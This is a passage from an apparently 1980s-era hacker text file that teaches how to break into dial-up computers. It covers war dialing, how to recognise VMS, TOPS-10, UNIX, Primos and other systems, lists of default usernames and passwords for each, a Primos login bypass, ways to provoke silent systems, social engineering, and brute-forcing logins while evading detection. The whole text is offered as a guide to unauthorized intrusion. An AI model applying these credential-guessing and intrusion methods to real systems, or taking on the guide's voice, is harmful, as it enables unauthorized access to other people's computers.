   Finally, there's the time-honored method of computer hunting that was made
famous among the non-hacker crowd by that Oh-So-Technically-Accurate movie
Wargames.  You pick a three digit phone prefix in your area and dial every
number from 0000 --> 9999 in that prefix, making a note of all the carriers
you find.  There is software available to do this for nearly every computer
in the world, so you don't have to do it by hand.

Part Three: I've Found a Computer, Now What?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   This next section is applicable universally.  It doesn't matter how you
found this computer, it could be through a network, or it could be from
carrier scanning your High School's phone prefix, you've got this prompt
this prompt, what the hell is it?
   I'm *NOT* going to attempt to tell you what to do once you're inside of
any of these operating systems.  Each one is worth several G-files in its
own right.  I'm going to tell you how to identify and recognize certain
OpSystems, how to approach hacking into them, and how to deal with something
that you've never seen before and have know idea what it is.


VMS-       The VAX computer is made by Digital Equipment Corporation (DEC),
           and runs the VMS (Virtual Memory System) operating system.
           VMS is characterized by the 'Username:' prompt.  It will not tell
           you if you've entered a valid username or not, and will disconnect
           you after three bad login attempts.  It also keeps track of all
           failed login attempts and informs the owner of the account next time
           s/he logs in how many bad login attempts were made on the account.
           It is one of the most secure operating systems around from the
           outside, but once you're in there are many things that you can do
           to circumvent system security.  The VAX also has the best set of
           help files in the world.  Just type HELP and read to your heart's
           content.
           Common Accounts/Defaults:  [username: password [[,password]] ]
           SYSTEM:     OPERATOR or MANAGER or SYSTEM or SYSLIB
           OPERATOR:   OPERATOR
           SYSTEST:    UETP
           SYSMAINT:   SYSMAINT or SERVICE or DIGITAL
           FIELD:      FIELD or SERVICE
           GUEST:      GUEST or unpassworded
           DEMO:       DEMO  or unpassworded
           DECNET:     DECNET


DEC-10-    An earlier line of DEC computer equipment, running the TOPS-10
           operating system.  These machines are recognized by their
           '.' prompt.  The DEC-10/20 series are remarkably hacker-friendly,
           allowing you to enter several important commands without ever
           logging into the system.  Accounts are in the format [xxx,yyy] where
           xxx and yyy are integers.  You can get a listing of the accounts and
           the process names of everyone on the system before logging in with
           the command .systat (for SYstem STATus).  If you seen an account
           that reads [234,1001]   BOB JONES, it might be wise to try BOB or
           JONES or both for a password on this account.  To login, you type
           .login xxx,yyy  and then type the password when prompted for it.
           The system will allow you unlimited tries at an account, and does
           not keep records of bad login attempts.  It will also inform you
           if the UIC you're trying (UIC = User Identification Code, 1,2 for
           example) is bad.
           Common Accounts/Defaults:
           1,2:        SYSLIB or OPERATOR or MANAGER
           2,7:        MAINTAIN

UNIX-      There are dozens of different machines out there that run UNIX.
           While some might argue it isn't the best operating system in the
           world, it is certainly the most widely used.  A UNIX system will
           usually have a prompt like 'login:' in lower case.  UNIX also
           will give you unlimited shots at logging in (in most cases), and
           there is usually no log kept of bad attempts.
           Common Accounts/Defaults: (note that some systems are case
           sensitive, so use lower case as a general rule.  Also, many times
           the accounts will be unpassworded, you'll just drop right in!)
           root:       root
           admin:      admin
           sysadmin:   sysadmin or admin
           unix:       unix

Prime-     Prime computer company's mainframe running the Primos operating
           system.  The are easy to spot, as the greet you with
           'Primecon 18.23.05' or the like, depending on the version of the
           operating system you run into.  There will usually be no prompt
           offered, it will just look like it's sitting there.  At this point,
           type 'login <username>'.  If it is a pre-18.00.00 version of Primos,
           you can hit a bunch of ^C's for the password and you'll drop in.
           Unfortunately, most people are running versions 19+.  Primos also
           comes with a good set of help files.  One of the most useful
           features of a Prime on Telenet is a facility called NETLINK.  Once
           you're inside, type NETLINK and follow the help files.  This allows
           you to connect to NUA's all over the world using the 'nc' command.
           For example, to connect to NUA 026245890040004, you would type
           @nc :26245890040004 at the netlink prompt.
           Common Accounts/Defaults:
           PRIME       PRIME or PRIMOS

HP-x000-   This system is made by Hewlett-Packard.  It is characterized by the
           ':' prompt.  The HP has one of the more complicated login sequences
           around- you type 'HELLO SESSION NAME,USERNAME,ACCOUNTNAME,GROUP'.
           Fortunately, some of these fields can be left blank in many cases.
           Since any and all of these fields can be passworded, this is not
           the easiest system to get into, except for the fact that there are
           usually some unpassworded accounts around.  In general, if the
           defaults don't work, you'll have to brute force it using the
           common password list (see below.)  The HP-x000 runs the MPE operat-
           ing system, the prompt for it will be a ':', just like the logon
           prompt.
           Common Accounts/Defaults:

IRIS-      IRIS stands for Interactive Real Time Information System.  It orig-
           inally ran on PDP-11's, but now runs on many other minis.  You can
           spot an IRIS by the 'Welcome to "IRIS" R9.1.4 Timesharing' banner,
           and the ACCOUNT ID? prompt.  IRIS allows unlimited tries at hacking
           in, and keeps no logs of bad attempts.  I don't know any default
           passwords, so just try the common ones from the password database
           below.
           Common Accounts:
           MANAGER
           BOSS

VM/CMS-    The VM/CMS operating system runs in International Business Machines
           (IBM) mainframes.  When you connect to one of these, you will get
           message similar to 'VM/370 ONLINE', and then give you a '.' prompt,
           just like TOPS-10 does.  To login, you type 'LOGON <username>'.
           Common Accounts/Defaults are:
           AUTOLOG1:            AUTOLOG or AUTOLOG1
           CMS:                 CMS

NOS-       NOS stands for Networking Operating System, and runs on the Cyber
           computer made by Control Data Corporation.  NOS identifies itself
           quite readily, with a banner of 'WELCOME TO THE NOS SOFTWARE
           SYSTEM.  COPYRIGHT CONTROL DATA 1978,1987'.  The first prompt you
           will get will be FAMILY:.  Just hit return here.  Then you'll get
           a USER NAME: prompt.  Usernames are typically 7 alpha-numerics
           characters long, and are *extremely* site dependent. Operator
           accounts begin with a digit, such as 7ETPDOC.
           Common Accounts/Defaults:
           $SYSTEM              unknown
           SYSTEMV              unknown

Decserver- This is not truly a computer system, but is a network server that
           has many different machines available from it.  A Decserver will
           say 'Enter Username>' when you first connect.  This can be anything,
           it doesn't matter, it's just an identifier.  Type 'c', as this is
           the least conspicuous thing to enter.  It will then present you
           with a 'Local>' prompt.  From here, you type 'c <systemname>' to
           connect to a system.  To get a list of system names, type
           'sh services' or 'sh nodes'.  If you have any problems, online
           help is available with the 'help' command.  Be sure and look for
           services named 'MODEM' or 'DIAL' or something similar, these are
           often outdial modems and can be useful!

GS/1-      Another type of network server.  Unlike a Decserver, you can't
           predict what prompt a GS/1 gateway is going to give you.  The
           default prompt it 'GS/1>', but this is redifinable by the
           system administrator.  To test for a GS/1, do a 'sh d'.  If that
           prints out a large list of defaults (terminal speed, prompt,
           parity, etc...), you are on a GS/1.  You connect in the same manner
           as a Decserver, typing 'c <systemname>'.  To find out what systems
           are available, do a 'sh n' or a 'sh c'.  Another trick is to do a
           'sh m', which will sometimes show you a list of macros for logging
           onto a system.  If there is a macro named VAX, for instance, type
           'do VAX'.

           The above are the main system types in use today.  There are 
           hundreds of minor variants on the above, but this should be
           enough to get you started.
          
Unresponsive Systems
~~~~~~~~~~~~~~~~~~~~
   Occasionally you will connect to a system that will do nothing but sit
there.  This is a frustrating feeling, but a methodical approach to the system
will yield a response if you take your time.  The following list will usually
make *something* happen.
1)  Change your parity, data length, and stop bits.  A system that won't re-
    spond at 8N1 may react at 7E1 or 8E2 or 7S2.  If you don't have a term
    program that will let you set parity to EVEN, ODD, SPACE, MARK, and NONE,
    with data length of 7 or 8, and 1 or 2 stop bits, go out and buy one. 
    While having a good term program isn't absolutely necessary, it sure is
    helpful.
2)  Change baud rates.  Again, if your term program will let you choose odd
    baud rates such as 600 or 1100, you will occasionally be able to penetrate
    some very interesting systems, as most systems that depend on a strange
    baud rate seem to think that this is all the security they need...
3)  Send a series of <cr>'s.
4)  Send a hard break followed by a <cr>.
5)  Type a series of .'s (periods).  The Canadian network Datapac responds
    to this.
6)  If you're getting garbage, hit an 'i'.  Tymnet responds to this, as does
    a MultiLink II.
7)  Begin sending control characters, starting with ^A --> ^Z.
8)  Change terminal emulations.  What your vt100 emulation thinks is garbage
    may all of a sudden become crystal clear using ADM-5 emulation.  This also
    relates to how good your term program is.
9)  Type LOGIN, HELLO, LOG, ATTACH, CONNECT, START, RUN, BEGIN, LOGON, GO,
    JOIN, HELP, and anything else you can think of.
10) If it's a dialin, call the numbers around it and see if a company
    answers.  If they do, try some social engineering.

Brute Force Hacking
~~~~~~~~~~~~~~~~~~~
   There will also be many occasions when the default passwords will not work
on an account.  At this point, you can either go onto the next system on your
list, or you can try to 'brute-force' your way in by trying a large database
of passwords on that one account.  Be careful, though!  This works fine on
systems that don't keep track of invalid logins, but on a system like a VMS,
someone is going to have a heart attack if they come back and see '600 Bad
Login Attempts Since Last Session' on their account.  There are also some
operating systems that disconnect after 'x' number of invalid login attempts
and refuse to allow any more attempts for one hour, or ten minutes, or some-
times until the next day.
   The following list is taken from my own password database plus the data-
base of passwords that was used in the Internet UNIX Worm that was running
around in November of 1988.  For a shorter group, try first names, computer
terms, and obvious things like 'secret', 'password', 'open', and the name
of the account.  Also try the name of the company that owns the computer
system (if known), the company initials, and things relating to the products
the company makes or deals with.
